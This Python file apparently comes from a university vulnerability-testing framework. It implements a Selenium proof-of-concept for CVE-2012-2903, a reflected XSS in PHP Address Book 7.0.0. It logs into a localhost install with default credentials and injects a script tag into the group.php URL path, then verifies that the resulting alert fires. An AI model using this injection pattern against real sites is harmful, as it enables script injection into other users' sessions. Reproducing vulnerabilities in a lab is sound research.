
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.


import sys
import os
import time

import selenium.common.exceptions
import framework

class Exploit (framework.Exploit):

    attributes = {'Name' :        "CVE_2012_2903_B",
                  'Description' : "PHP Address Book XSS exploit",
                  'References' :  [['http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-2903'],
                                   ['http://www.darksecurity.de/index.php?/215-SSCHADV2012-013-PHP-Address-Book-7.0.0-Multiple-security-vulnerabilities.html']], 
                  'Target' :      "PHP Address Book 7.0.0",
                  'TargetLicense' : '',
                  'VulWikiPage' : "http://seamster.cs.umd.edu/vulwiki/index.php/CVE-2012-2903",
                  'Type' : 'XSS',
                  'Privileged' : True
                  }
    found = False

    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        return
            

    def exploit(self):
        driver = self.create_selenium_driver()
        
        driver.get("http://127.0.0.1/php/")
        driver.get_element(by_xpath="//input[@name = 'user']").send_keys("admin")
        driver.get_element(by_xpath="//input[@name = 'pass']").send_keys("secret")
        driver.get_element(by_xpath="//input[@type = 'submit']").click()
        
        driver.get("http://127.0.0.1/php/group.php/\" /><script> alert('xss')</script>")

        tries = 4
        while tries and not self.found:
            alert = driver.switch_to_alert()
            try:
                time.sleep(1)
                alert.accept()
                self.found = True
            except:
                self.logger.warning("Failed to find alert box")
            tries -=1
        
        if self.visible:
            time.sleep(10)

        driver.cleanup()
        return

    def verify(self):
        return self.found
